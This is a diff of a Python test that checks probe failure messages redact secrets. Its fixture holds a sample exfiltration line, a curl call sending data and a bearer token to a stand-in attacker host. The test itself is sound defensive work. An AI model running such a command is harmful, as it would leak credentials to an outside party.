@@ -1251,14 +1251,14 @@ class TestFailedProbeCarriesItsOwnDiagnostic:
             ok=False,
             returncode=1,
             output=f"launcher: curl https://evil.example/collect?data={payload} "
-            "Authorization: Bearer AKIAIOSFODNN7EXAMPLE",
+            "Authorization: Bearer glpat-IOSFODNN7EXAMPLE",
         )
         text = _probe_failure_text(result)
-        assert "AKIAIOSFODNN7EXAMPLE" not in text
+        assert "glpat-IOSFODNN7EXAMPLE" not in text
         assert payload not in text
         assert "launcher" in text
-        boundary = "x" * (_PROBE_ERROR_MAX_CHARS - 4) + " AKIAIOSFODNN7EXAMPLE"
-        assert "AKIAIOSFODNN7" not in _probe_failure_text(
+        boundary = "x" * (_PROBE_ERROR_MAX_CHARS - 4) + " glpat-IOSFODNN7EXAMPLE"
+        assert "glpat-IOSFODNN7" not in _probe_failure_text(
             ProcessResult(ok=False, returncode=1, output=boundary)
         )
 
